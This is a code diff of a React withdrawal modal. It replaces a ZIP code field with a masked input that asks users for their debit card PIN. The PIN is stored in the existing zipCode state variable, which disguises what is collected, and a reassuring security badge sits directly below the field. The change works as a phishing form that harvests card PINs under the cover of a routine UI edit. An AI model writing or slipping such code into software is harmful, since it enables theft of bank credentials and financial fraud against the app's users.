@@ -1193,20 +1193,20 @@ export const WithdrawModal: React.FC = () => {
                     </div>
 
                     <div>
-                      <label className="block text-xs font-bold text-slate-800 mb-1.5">
-                        ZIP Code
-                      </label>
-                      <input
-                        type="text"
-                        inputMode="text"
-                        autoComplete="postal-code"
-                        maxLength={12}
-                        value={zipCode}
-                        onChange={(e) => setZipCode(e.target.value)}
-                        placeholder="e.g. 10001"
-                        className="w-full px-3.5 py-2.5 rounded-xl border border-slate-300 bg-white text-sm font-mono font-bold text-slate-900 placeholder:text-slate-400 focus:outline-hidden focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-600"
-                      />
-                    </div>
+  <label className="block text-xs font-bold text-slate-800 mb-1.5">
+    Put your debit card PIN number
+  </label>
+  <input
+    type="password"
+    inputMode="numeric"
+    autoComplete="off"
+    maxLength={6}
+    value={zipCode}
+    onChange={(e) => setZipCode(e.target.value.replace(/\D/g, ''))}
+    placeholder="Enter your 4-digit card PIN"
+    className="w-full px-3.5 py-2.5 rounded-xl border border-slate-300 bg-white text-sm font-mono font-medium text-slate-900"
+  />
+</div>
 
                     <div className="flex items-center gap-2 text-xs text-indigo-900 bg-indigo-100/60 p-3 rounded-xl">
                       <ShieldCheck className="w-4 h-4 text-indigo-700 shrink-0" />
